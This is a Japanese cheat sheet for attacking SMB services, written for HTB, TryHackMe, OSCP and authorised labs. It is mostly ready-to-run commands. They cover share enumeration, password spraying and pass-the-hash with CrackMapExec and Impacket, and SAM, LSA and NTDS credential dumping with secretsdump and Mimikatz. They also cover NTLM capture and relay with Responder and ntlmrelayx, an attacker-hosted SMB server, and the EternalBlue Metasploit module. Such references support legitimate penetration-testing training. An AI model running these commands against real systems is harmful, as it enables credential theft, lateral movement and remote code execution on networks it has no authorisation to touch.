
# SMB Cheat Sheet

対象: HTB / THM / OSCP / 許可済み検証環境  
前提: `target` / `targettmux` / `scaninit` / `ports-serv` / `nextsvc` / `fshot` / Obsidianノート運用

---

## 0. 使い始め

### セッション開始

```zsh
targettmux 10.10.10.10 targetname
scaninit
ports-serv
nextsvc
```

### SMBが見えたらまずやること

確認対象:

* `139/tcp`
* `445/tcp`

見るポイント:

* ホスト名 / ドメイン名 / Workgroup
* anonymous / guest 可否
* 共有一覧
* 認証後に見える範囲
* `SYSVOL` / `NETLOGON` / `C$` / `ADMIN$`
* SMB Signing
* 既知脆弱性（MS17-010 など）

---

## 1. 初動（Discovery）

### 最小セット

```zsh
nmap -Pn -n -p 139,445 --script smb-os-discovery,smb-enum-shares,smb-enum-users "$TARGET_IP" -oA "$OUT/nmap_smb_basic"
smbclient -L //$TARGET_IP -N
smbmap -H $TARGET_IP
enum4linux -a $TARGET_IP | tee "$OUT/enum4linux_smb.txt"
```

### NetBIOS / OS / ドメイン確認

```zsh
sudo nbtscan -r $TARGET_IP
nmap -Pn -n -p 139,445 --script smb-os-discovery "$TARGET_IP" -oA "$OUT/nmap_smb_os"
```

* NetBIOS 名
* ホスト名
* ドメイン / Workgroup
* OS 情報
* SMB が 139/445 のどちらで応答しているか
### SMB系NSE確認

```zsh
ls -1 /usr/share/nmap/scripts/smb*
```

### MS17-010 の補助確認

```zsh
nmap -Pn -n -p 445 --script smb-vuln-ms17-010 "$TARGET_IP" -oA "$OUT/nmap_smb_ms17_010"
```

> 脆弱性判定は補助。NSEの結果だけを過信しない。

---

## 2. Anonymous / Guest 列挙

### 共有一覧

```zsh
smbclient -L //$TARGET_IP -N
smbclient -L //$TARGET_IP/ -N
smbclient -L //$TARGET_IP -U guest
smbmap -H $TARGET_IP
smbmap -H $TARGET_IP -u '' -p ''
```

### 見るポイント

* anonymous / guest が通るか
* 読める share があるか
* 書ける share があるか
* `IPC$`, `ADMIN$`, `C$`, `SYSVOL`, `NETLOGON` の有無

### 深掘り

```zsh
nmap -Pn -n -p 139,445 --script smb-enum-shares "$TARGET_IP" -oA "$OUT/nmap_smb_shares"
nmap -Pn -n -p 139,445 --script smb-enum-users "$TARGET_IP" -oA "$OUT/nmap_smb_users"
```

---

## 3. 認証あり列挙

### CrackMapExec で全体像確認

```zsh
crackmapexec smb $TARGET_IP -u $USER -p $PASS
crackmapexec smb $TARGET_IP -u $USER -p $PASS --shares
crackmapexec smb $TARGET_IP -u $USER -p $PASS --users
crackmapexec smb $TARGET_IP -u $USER -p $PASS --sessions
crackmapexec smb $TARGET_IP -u $USER -p $PASS --pass-pol
crackmapexec smb $TARGET_IP -u $USER -p $PASS --all
crackmapexec smb $TARGET_IP -u $USER -p $PASS -p 445 --shares
crackmapexec smb $TARGET_IP -u $USER -p $PASS -d $DOMAIN --shares
crackmapexec smb $TARGET_IP -u $USER -p $PASS --all | tee "$OUT/cme_smb_all.txt"

crackmapexec smb <Rhost/range> -u '$USER' -p '$PASS' --shares
crackmapexec smb <Rhost/range> -u '$USER' -p '$PASS' --disks
crackmapexec smb <Rhost/range> -u '$USER' -p '$PASS' --users
crackmapexec smb <Rhost/range> -u '$USER' -p '$PASS' --sessions
crackmapexec smb <Rhost/range> -u '$USER' -p '$PASS' --pass-pol
crackmapexec smb <Rhost/range> -u '$USER' -p '$PASS' --groups {groupname}
```

### ドメイン指定あり

```zsh
crackmapexec smb $TARGET_IP -u $USER -p $PASS -d $DOMAIN --shares
smbmap -H $TARGET_IP -u $USER -p $PASS -d $DOMAIN
```

### smbmap で権限確認

```zsh
smbmap -H $TARGET_IP -u $USER -p $PASS
smbmap -H $TARGET_IP -u $USER -p $PASS -r $SHARE
```

### smbclient で share に入る

```zsh
smbclient //$TARGET_IP/$SHARE -U $USER
smbclient //$TARGET_IP/$SHARE -U $DOMAIN/$USER
smbclient //$TARGET_IP/$SHARE -U $USER%$PASS
```

### Windows 側からの列挙

```cmd
net view \\<computername_or_IP> /all
net view \\$TARGET_HOST
net view $TARGET_HOST
```

```powershell
Get-SmbShare
Get-SmbSession
Get-SmbMapping
Invoke-Command -ComputerName $TARGET_HOST -ScriptBlock { Get-SmbShare }
Invoke-ShareFinder -Verbose
```

* Windows ホスト上から共有確認
* 現在の SMB セッション確認
* 既存マッピング確認
* PowerShell でリモート列挙

### 見るポイント

* local auth か domain auth か
* 読み取り専用か書き込み可能か
* reuse できる資格情報か
* セッションがあるか
* パスワードポリシーが弱いか

---

## 4. Share Access / File Operations

### smbclient で share に入る

```bash
smbclient //server/share
smbclient //$<DC>/SYSVOL -U "$DOMAIN\\$USER"
smbclient //$TARGET_IP/$SHARE -U $USER%$PASS
```
### smbclient 基本操作

```zsh
ls
cd <dir>
get <file>
put <file>
mkdir <dir>
rm <file>
```

### 再帰取得の定番

```zsh
mask ""
recurse ON
prompt OFF
mget *
```

> share 全体を一気に落としたい時の定番。
### ワンライナー例

```zsh
smbclient //$TARGET_IP/$SHARE -U $USER%$PASS -c "get remote.txt local.txt"
smbclient //$TARGET_IP/$SHARE -U $USER%$PASS -c "put payload.ps1"
smbclient //$TARGET_IP/$SHARE -U $USER%$PASS -c "mget *"
```

### Linuxからマウント

```zsh
sudo mkdir -p /mnt/share
sudo mount -t cifs //$TARGET_IP/$SHARE /mnt/share -o username=$USER,password=$PASS
```

SMB1 が必要そうな古い環境だけ:

```zsh
sudo mount -t cifs //$TARGET_IP/$SHARE /mnt/share -o username=$USER,password=$PASS,vers=1.0,nodfs
```

### Windows で共有をマウント

```cmd
net use Z: \\$TARGET_HOST\$SHARE /user:[$DOMAIN\]$USER $PASS
net use Z: \\$TARGET_HOST\$SHARE /user:$USER $PASS /persistent:yes
net use \\$TARGET_HOST\$SHARE C:\mnt\share /user:alice
net use \\$TARGET_HOST\C$ /user:$USER $PASS
```
### ローカルへコピー / 共有へコピー

```bash
cp $MOUNT_POINT/<file> $LOCAL_PATH
```

```powershell
Copy-Item -Path <file> -Destination \\$TARGET_HOST\share\
Copy-Item -Path \\$<Server>\$SHARE\<file> -Destination $LOCAL_PATH
robocopy <DriveLetter>:\<Path> $LOCAL_PATH <FilePattern>
```
### 解除

```zsh
sudo umount /mnt/share
```

```cmd
net use Z: /delete
net use \\$TARGET_HOST\$SHARE /delete
```

```powershell
Remove-SmbMapping -RemotePath "\\$TARGET_HOST\$SHARE" -Force
```
---

## 5. ドメイン環境での高価値確認

### まず見る share

* `SYSVOL`
* `NETLOGON`
* `C$`
* `ADMIN$`

### SYSVOL / GPP

```zsh
smbclient //$TARGET_IP/SYSVOL -U "$DOMAIN\\$USER"
crackmapexec smb $TARGET_IP -u $USER -p $PASS -d $DOMAIN -M gpp_password
crackmapexec smb <TARGET[s]> -u $USER -H LMHash:NTLMHash -d $DOMAIN -M gpp_password
```

### 優先して探すもの

* `Groups.xml`
* `ScheduledTasks.xml`
* `Services.xml`
* `Printers.xml`
* `Drives.xml`

> GPP password は優先度が高い。

---

## 6. SID / RID / ユーザー列挙

```zsh
enum4linux -a $TARGET_IP | tee "$OUT/enum4linux_full.txt"
lookupsid.py $DOMAIN/$USER:$PASS@$TARGET_IP
```

用途:

* RID cycling
* 有効ユーザー候補の発見
* グループ列挙の足掛かり

---

## 7. パスワードスプレー / 認証確認

### 単一資格情報

```zsh
crackmapexec smb $TARGET_IP -u $USER -p $PASS
smbclient //server/share -U $USER
smbclient //server/share -U $DOMAIN/$USER
smbclient.py [domain]/[user]:[password_or_hash]@[Target IP Address]
```

### ユーザーリスト × 単一パスワード

```zsh
crackmapexec smb $TARGET_IP -u users.txt -p '$PASS' --continue-on-success
crackmapexec smb $TARGET_IP -u users.txt -p '$PASS' -d $DOMAIN --continue-on-success
crackmapexec smb <Rhost/range> -u user.txt -p '$PASS' --continue-on-success
```

### user / pass リスト

```zsh
crackmapexec smb $TARGET_IP -u users.txt -p passwords.txt --continue-on-success
crackmapexec smb <Rhost/range> -u user.txt -p password.txt --continue-on-success
```

---

## 8. Pass-the-Hash / Local Auth

```zsh
crackmapexec smb $TARGET_IP -u $USER -H $HASH --local-auth
psexec.py -hashes lmhash:nthash $DOMAIN/$USER@$TARGET_IP
smbexec.py -hashes lmhash:nthash $DOMAIN/$USER@$TARGET_IP
wmiexec.py -hashes lmhash:nthash $DOMAIN/$USER@$TARGET_IP
atexec.py -hashes lmhash:nthash $DOMAIN/$USER@$TARGET_IP
impacket-psexec $DOMAIN/$USER@$TARGET_IP -hashes <NTLM_hash>
```

---

## 9. 管理者権限あり

### コマンド実行

```zsh
crackmapexec smb $TARGET_IP -u $USER -p $PASS -x 'whoami'
```

### ダンプ系

```zsh
crackmapexec smb $TARGET_IP -u $USER -p $PASS --sam
crackmapexec smb $TARGET_IP -u $USER -p $PASS --lsa
crackmapexec smb $TARGET_IP -u $USER -p $PASS --ntds
secretsdump.py $DOMAIN/$USER:$PASS@$TARGET_IP
```

* `--sam`: ローカル SAM
* `--lsa`: LSA secrets
* `--ntds`: AD DB
* `secretsdump.py`: Impacket 系の本命

### 対話・実行系

```zsh
psexec.py $DOMAIN/$USER:$PASS@$TARGET_IP
wmiexec.py $DOMAIN/$USER:$PASS@$TARGET_IP
smbexec.py $DOMAIN/$USER:$PASS@$TARGET_IP
atexec.py $DOMAIN/$USER:$PASS@$TARGET_IP
```

### ざっくり使い分け

* `psexec`: 強いが目立つ
* `wmiexec`: 対話しやすい
* `smbexec`: SMBベース代替
* `atexec`: タスク経由

---

## 10. Relay / Capture / Signing

### Responder

```zsh
sudo responder -I tun0 -wrf
```

### NTLM Relay

```zsh
smbrelayx -h $TARGET_IP
impacket-ntlmrelayx --no-http-server -smb2support -t $TARGET_IP -c "whoami"
impacket-ntlmrelayx -tf relay.txt -of netntlm -smb2support -socks
Invoke-Inveigh -ConsoleOutput Y -NBNS Y -HTTP Y -HTTPS Y -Proxy Y
```

### 自前SMBサーバ

```zsh
impacket-smbserver -smb2support share .
impacket-smbserver -smb2support . .
sudo python3 smbserver.py <share_name> <path> -smb2support
dir \\<attacker_ip>\test
```

### 成立条件として見ること

* SMB Signing 無効
* 誘導可能な被害端末あり
* relay先あり
* relay先で管理者化可能か

---

## 11. Remote Command Execution

### CrackMapExec 経由

```bash
crackmapexec smb <Rhost/range> -u '$USER' -p '$PASS' -x 'command'
crackmapexec smb -L
crackmapexec smb -M mimikatx --options
crackmapexec smb <Rhost/range> -u '$USER' -p '$PASS' -M mimikatz
crackmapexec smb <Rhost/range> -u '$USER' -p '$PASS' -M mimikatz -o COMMAND='privilege::debug'
```

#### 用途

* 単発コマンド実行
* モジュール一覧確認
* Mimikatz 系実行

---

### Impacket / PsExec 系

```bash
psexec.py test.local/john:password123@10.10.10.1
psexec.py -hashes lmhash:nthash test.local/john@10.10.10.1
python3 psexec.py $DOMAIN/$USER:$PASS@$TARGET_IP
impacket-psexec $DOMAIN/$USER@$TARGET_IP -hashes <NTLM_hash>
```

```cmd
psexec.exe \\$TARGET_HOST -u $DOMAIN\$USER -p $PASS cmd.exe
PsExec.exe \\$TARGET_HOST -u $USER -p $PASS -c <file>
psexec \\$TARGET_HOST -u $USER -p $PASS cmd
```

#### 特徴

* サービス作成型
* 管理者権限が必要
* 痕跡が残りやすい

---

### smbexec / wmiexec / atexec

```bash
smbexec.py test.local/john:password123@10.10.10.1
smbexec.py -hashes lmhash:nthash test.local/john@10.10.10.1

wmiexec.py test.local/john:password123@10.10.10.1
wmiexec.py -hashes lmhash:nthash test.local/john@10.10.10.1

atexec.py test.local/john:password123@10.10.10.1
atexec.py -hashes lmhash:nthash test.local/john@10.10.10.1
```

#### ざっくり使い分け

* `psexec`: 強いが目立つ
* `wmiexec`: 対話しやすい
* `smbexec`: SMB ベースの代替
* `atexec`: スケジュールタスク経由

---
## 12. Legacy / Exploit

### MS17-010

```zsh
nmap -Pn -n -p 445 --script smb-vuln-ms17-010 "$TARGET_IP"
```

### 演習環境限定

```zsh
use exploit/windows/smb/ms17_010_eternalblue
```

> 演習環境以外では扱わない。

---

## 13. あなたの環境向け最小フロー

### ① ターゲット準備

```zsh
targettmux 10.10.10.10 fileserver
scaninit
ports-serv
nextsvc
```

### ② SMB最小列挙

```zsh
nmap -Pn -n -p 139,445 --script smb-os-discovery,smb-enum-shares,smb-enum-users "$TARGET_IP" -oA "$OUT/nmap_smb_basic"
smbclient -L //$TARGET_IP -N
smbmap -H $TARGET_IP
enum4linux -a $TARGET_IP | tee "$OUT/enum4linux_smb.txt"
```

### ③ 認証情報が出たら

```zsh
crackmapexec smb $TARGET_IP -u $USER -p $PASS --shares --users --sessions --pass-pol
smbmap -H $TARGET_IP -u $USER -p $PASS
smbclient //$TARGET_IP/$SHARE -U $USER%$PASS
```

### ④ 管理者なら

```zsh
crackmapexec smb $TARGET_IP -u $USER -p $PASS -x 'whoami'
crackmapexec smb $TARGET_IP -u $USER -p $PASS --sam
crackmapexec smb $TARGET_IP -u $USER -p $PASS --lsa
secretsdump.py $DOMAIN/$USER:$PASS@$TARGET_IP

psexec.py $DOMAIN/$USER:$PASS@$TARGET_IP
wmiexec.py $DOMAIN/$USER:$PASS@$TARGET_IP
smbexec.py $DOMAIN/$USER:$PASS@$TARGET_IP
```

---

## 14. Obsidian記録のコツ

### コマンド結果は result に保存

```zsh
enum4linux -a $TARGET_IP | tee "$OUT/enum4linux_smb.txt"
crackmapexec smb $TARGET_IP -u $USER -p $PASS --all | tee "$OUT/cme_smb_all.txt"
```

### スクリーンショット

```zsh
fshot
```

### ノートに残すべきポイント

* anonymous 可否
* 読み取り share
* 書き込み share
* ドメイン名
* 有効ユーザー
* SMB Signing
* `SYSVOL` / `NETLOGON` の有無
* 再利用可能 creds
* 管理者権限の有無
* `sam / lsa / ntds` 実行可否

---

## 15. 優先チェックリスト

### Anonymous / Guest

* [ ] `smbclient -L //$TARGET_IP -N`
* [ ] `smbmap -H $TARGET_IP`
* [ ] `enum4linux -a $TARGET_IP`

### Shares

* [ ] 読み取り可能 share
* [ ] 書き込み可能 share
* [ ] `SYSVOL`
* [ ] `NETLOGON`
* [ ] `C$`
* [ ] `ADMIN$`

### Users / Domain

* [ ] ドメイン名
* [ ] 有効ユーザー
* [ ] パスワードポリシー
* [ ] SID / RID 情報

### Authenticated

* [ ] `--shares`
* [ ] `--users`
* [ ] `--sessions`
* [ ] `--pass-pol`

### Admin

* [ ] `-x 'whoami'`
* [ ] `--sam`
* [ ] `--lsa`
* [ ] `--ntds`
* [ ] `secretsdump.py`
* [ ] `wmiexec.py / psexec.py / smbexec.py`

### Relay / Legacy

* [ ] SMB Signing
* [ ] Responder
* [ ] ntlmrelayx
* [ ] MS17-010

---

## 16. 最小3段階だけ覚える版

### Anonymous 初動

```zsh
smbclient -L //$TARGET_IP -N
smbmap -H $TARGET_IP
enum4linux -a $TARGET_IP
```

### Credsあり

```zsh
crackmapexec smb $TARGET_IP -u $USER -p $PASS --shares --users --sessions
smbmap -H $TARGET_IP -u $USER -p $PASS
smbclient //$TARGET_IP/$SHARE -U $USER%$PASS
```

### Adminあり

```zsh
crackmapexec smb $TARGET_IP -u $USER -p $PASS -x 'whoami'
crackmapexec smb $TARGET_IP -u $USER -p $PASS --sam
secretsdump.py $DOMAIN/$USER:$PASS@$TARGET_IP
wmiexec.py $DOMAIN/$USER:$PASS@$TARGET_IP
```

```

必要なら次にこれをあなたの `Template-Target.md` の `Services` / `Next Actions` の書き方に合わせて、さらに短い「SMBサービス欄テンプレ版」に圧縮します。
```
